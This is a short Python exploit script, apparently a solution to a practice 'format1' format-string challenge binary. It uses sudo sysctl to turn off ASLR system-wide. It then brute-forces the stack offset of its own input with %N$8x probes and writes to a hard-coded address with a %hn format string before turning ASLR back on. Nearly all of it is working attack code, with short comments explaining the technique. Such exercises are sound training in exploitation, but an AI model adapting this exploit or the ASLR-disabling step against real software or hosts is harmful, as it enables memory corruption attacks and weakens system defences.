#!/usr/bin/python3

import subprocess
import struct

# It is required to disable ASLR, because otherwise, we don't know where our format string is on the stack.
# We need to know where it is so that we can control the address that we are using %n to write to.
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=0"])

offset = -1

for i in range(140,180):
    output = subprocess.run(["../Binaries/format1","AAAA %"+str(i)+"$8x"],stdout=subprocess.PIPE).stdout.decode("utf8")
    if "41414" in output:
        print(output)
        offset = i
        break
    
print("Found offset =", offset)

# Run the exploit
address = struct.pack("<L", 0x08049638).decode("utf8", "surrogateescape")
proc = subprocess.run(["../Binaries/format1", address + " %" + str(offset) + "$hn"],stdout=subprocess.PIPE)
print(proc)

# Reenable ASLR
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=2"])